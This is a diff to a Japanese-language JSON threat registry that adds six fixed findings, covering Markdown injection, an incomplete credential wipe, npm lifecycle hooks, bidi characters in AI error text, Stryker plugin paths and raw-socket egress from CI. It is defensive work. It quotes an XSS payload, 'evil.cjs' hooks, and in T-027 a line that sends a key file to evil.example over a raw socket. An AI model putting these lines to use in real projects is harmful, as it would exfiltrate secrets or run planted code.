@@ -570,6 +570,96 @@
         "file": "src/shared/__tests__/redactionCoverage.test.ts",
         "test": "★ JSON のエラー本文に裸で反射された Cursor の鍵を伏せる (threat: T-021)"
       }
+    },
+    {
+      "id": "T-022",
+      "found": "2026-10-13",
+      "foundBy": "hunt pass 517 (renderer)",
+      "surface": "renderer",
+      "class": "ai-phishing",
+      "severity": "low",
+      "title": "財務分析レポート (.md) の表題が利用者の事業名を素で載せ、Markdown の見出し・表・箇条書きを注入できた",
+      "status": "fixed",
+      "fix": "financialReport.ts:141 は `# 財務分析レポート — ${label}` と書き、label は利用者が打つ事業名。実測 (直す前): 事業名を `<img onerror=alert(1)>` や改行 + `## 偽の見出し` にすると、書き出す .md にそのまま載り、ダウンロードして人に渡る文書で偽の構造が立つ。markdownExportCensus.test.ts は financialReport を freeText:none (= 利用者の文は通らない) と分類していたが偽で、label がまさに利用者の文だった。直し: escapeMarkdownInline(label) を通す (バックスラッシュ・パイプ・改行・< を無害化)。census の行を freeText:escaped へ移し importsEscaper で機械検証、件数を {escaped:2,none:3} → {escaped:3,none:2} に。EC事業 等の既存の正当な表題は無害化後も 1 字も変わらない (対照済み)。",
+      "regression": {
+        "file": "src/renderer/data/__tests__/financialReport.test.ts",
+        "test": "★ `<img onerror>` を含む事業名は素で載らない (&lt; へ逃がす) (threat: T-022)"
+      }
+    },
+    {
+      "id": "T-023",
+      "found": "2026-10-13",
+      "foundBy": "hunt pass 517 (main-ipc)",
+      "surface": "main-ipc",
+      "class": "living-off-the-land",
+      "severity": "low",
+      "title": "「すべてのデータを削除」が目標パスにディレクトリが化けていると io.rm (非 recursive) で投げ、資格情報が消えずに残った",
+      "status": "fixed",
+      "fix": "eraseAll.ts の eraseFileAndLitter は io.rm(本体) / io.rm(.prev 控え) / io.rm(litter) を非 recursive で呼んでいた。実測 (本物の fs・mkdtemp): secrets.json / その .prev / litter のどれかにディレクトリを化けさせ中にファイルを置くと、rm が EISDIR/ENOTEMPTY で投げてワイプが途中で止まり、植えたファイル (= 資格情報に化けた物) が残った。利用者が廃棄前に「全部消す」を押したのに秘密が生き残る。直し: 3 つの io.rm を { recursive: true } へ (force は付けない —— force は ENOENT を飲むので missing/deleted の区別 (パス 134 の契約) が壊れる)。recursive はディレクトリ木ごと消し、missing の判定は維持。親ディレクトリの許可リストは採らない —— data/a/b/c/deep.md を通す既存の設計 (T-002) を壊すため。",
+      "regression": {
+        "file": "src/main/__tests__/eraseAll.test.ts",
+        "test": "★ 本体がディレクトリに化けても deleted になり、植えたファイルも残らない (threat: T-023)"
+      }
+    },
+    {
+      "id": "T-024",
+      "found": "2026-10-13",
+      "foundBy": "hunt pass 517 (supply-chain)",
+      "surface": "supply-chain",
+      "class": "supply-chain",
+      "severity": "low",
+      "title": "lint:deps の lifecycle フック検出が install 系の綴りだけを数え、prebuild/postbuild 等の自動発火フックが無防備だった",
+      "status": "fixed",
+      "fix": "npm は npm run <name> のたびに pre<name>/post<name> を自動で走らせる。checkOwnLifecycle は固定の install 系キー一覧だけを見ており、postbuild:node evil.cjs を足しても (= npm run build で任意コードが走る) 門が鳴らなかった。直し: lifecycleHooksPresent(scripts, keys) が、明示キーに加えて scripts の全キーを走査し、pre/post を剥がした base が別の script として在れば present に足す。実測: postbuild / pretest 等を自動で捕まえる。危ない postbuild→release 梱包の経路そのものは T-016 (medium) が別に持つ —— ここは門の列挙漏れ (defense-in-depth) を閉じる。",
+      "regression": {
+        "file": "src/shared/__tests__/installTimeCodeGuarded.test.ts",
+        "test": "★ script の post フックは鳴る (threat: T-024)"
+      }
+    },
+    {
+      "id": "T-025",
+      "found": "2026-10-13",
+      "foundBy": "hunt pass 517 (renderer)",
+      "surface": "renderer",
+      "class": "ai-phishing",
+      "severity": "low",
+      "title": "村ページの AI エラーが第三者の失敗本文を折らず、双方向制御 (Trojan Source · U+202E)・不可視字が生で画面に出た",
+      "status": "fixed",
+      "fix": "VillagePage.tsx は互換 API (assistant/chat) の失敗を setAiError(res.message) / setAiError(String(e)) で受け :377 の ⚠ … : {aiError} に描いていた。res.message は第三者 (利用者が設定した互換 API の攻撃者ホスト) の本文で、web-shim の err()/redactForMessage は伏字と長さは掛けるが改行・双方向制御 (U+202E)・不可視字は残す。これは AI の失敗を描く最後の経路で externalTextOnOneLine を通していない唯一の所だった (他は AssistantPage・bestAnswers・コンシェルジュの T-005/T-020)。描画先 :375 は white-space: normal なので偽の ✅ 行は立たない (pre-wrap の吹き出しと違う) が、双方向制御は後続の字の見え方を入れ替えられる。直し: 動的な (第三者の) setAiError 2 か所を externalTextOnOneLine で包む (INVISIBLE を \\uXXXX へ逃がし空白を 1 つに畳む)。setAiError(undefined) のクリアは対象外。villageAiErrorFold.test.ts が setAiError の呼びを走査し、動的な引数は externalTextOnOneLine( で始まることを要求する (両方向の census + choke point の振る舞い)。",
+      "regression": {
+        "file": "src/renderer/pages/__tests__/villageAiErrorFold.test.ts",
+        "test": "★ 動的な (第三者の) 文を渡す setAiError は externalTextOnOneLine で始まる (threat: T-025)"
+      }
+    },
+    {
+      "id": "T-026",
+      "found": "2026-10-13",
+      "foundBy": "hunt pass 517 (supply-chain)",
+      "surface": "supply-chain",
+      "class": "supply-chain",
+      "severity": "low",
+      "title": "lint:deps が stryker.config.json の「コードを選ぶ欄」(plugins/testRunner/reporters/checkers) のローカルパスを検めなかった",
+      "status": "fixed",
+      "fix": "Stryker はプラグイン・ローダが plugins/testRunner/reporters/checkers 等の記述子を動的 import する (config-picks-code)。stryker.config.json に plugins:[./evil.cjs] や buildCommand を足すと、週次の mutation CI (mutation.yml) が走る時に任意コードが実行される —— lint:deps はこの設定ファイルを 1 度も見ていなかった。直し: checkStrykerCodePicking(config) が specFields [testRunner, plugins, reporters, checkers, htmlReporter] にローカル指定子 (isLocalSpecifier: ./ ../ ~ 絶対パス) が無いこと、buildCommand/commandRunner が無いことを検める。readStrykerConfig が無ければ null (= 検査なし) を返す。self-test 11 ケースで、ローカルパスの plugin / buildCommand / commandRunner がそれぞれ鳴ることを確かめた。package.json は全履歴 12 commit で安定資産の基準を満たさないので鎖には入れず門で形を見る (stryker.config.json も同様 · 63 commit)。",
+      "regression": {
+        "file": "src/shared/__tests__/installTimeCodeGuarded.test.ts",
+        "test": "★ plugins にローカルパスを入れると鳴る (threat: T-026)"
+      }
+    },
+    {
+      "id": "T-027",
+      "found": "2026-10-13",
+      "foundBy": "hunt pass 517 (network)",
+      "surface": "network",
+      "class": "ssrf-and-credential-egress",
+      "severity": "medium",
+      "title": "lint:network-targets の src 外の網の口が fetch 系の綴りだけを見て、生のソケット (net.connect 等) で CI から秘密を持ち出せた",
+      "status": "fixed",
+      "fix": "OUTSIDE_SEND_NAMES は fetch / https.request 等の綴りしか見ないので、net.connect / tls.connect / dgram.createSocket / http2.connect が素通りしていた。実測 (2026-10-13): tools/collect.cjs に require(net).connect(443, evil.example).end(fs.readFileSync(鍵)) を置く (ファイルの秘密の持ち出し) と 4 つの egress 門をすべて素通りした。CI (release.yml の梱包ジョブは署名鍵 4 本と GH_TOKEN を env に持つ) で走る script がこれを使えば、全 egress 門を回避して秘密を外へ送れる。母集団は git ls-files の全木なので、ソケットの呼び方を綴りに足すだけでこの門が捕まえる。直し: RAW_SOCKET_METHODS (connect|createConnection|createSocket) の OUTSIDE_RAW_SOCKET 正規表現を足し、outsideSendFindings の loop を !OUTSIDE_SEND.test(code) && !OUTSIDE_RAW_SOCKET.test(code) へ。文字列は loop 内で空へ潰されるので require(net) は require() として届く —— モジュール名は見分けられないがソケットの呼び方そのものを鳴らす (src の外 113 本に .connect(/.createConnection(/.createSocket( は 0 件なので偽陽性なし・実測で real gate exit 0)。self-test 6 ケース + 証人 8 ケースで陽性/陰性を留めた。",
+      "regression": {
+        "file": "src/shared/__tests__/networkTargetWitness.test.ts",
+        "test": "★ 陽性 (threat: T-027): %s を拾う"
+      }
     }
   ],
   "huntBacklog": [],
